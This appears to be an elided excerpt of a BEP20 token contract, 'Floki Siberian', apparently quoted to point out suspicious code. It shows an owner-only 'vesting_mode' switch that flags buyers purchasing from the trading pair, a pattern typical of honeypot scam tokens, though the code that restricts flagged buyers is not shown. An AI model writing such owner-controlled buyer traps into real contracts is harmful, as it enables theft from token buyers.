...
contract FlokiSiberian is IBEP20, Auth {
    ...
    string constant _name = "Floki Siberian";
    string constant _symbol = "Siberian2.0";
    ...
    bool public vestedLimitsEnabled = false;
    ...
    mapping (address => bool) private isLaunched;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x898Ca245530Ce6aCFDd8395be0CE05D06bb5aF41;
        teamFeeReceiver = 0xAbdb14c4333fdf666849B751881636D126f531b3;
        devFeeReceiver = 0x5CA872eCF73502DF448Dc035ae2010DA23DDF1cb;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!authorizations[sender] && !authorizations[recipient]){
            ...
            if(vestingmode && sender == pair){
                isvestedholder[recipient] = true;
            }
        }
    ...
    function vesting_mode(bool _status) public onlyOwner {
         vestingmode = _status;
    }
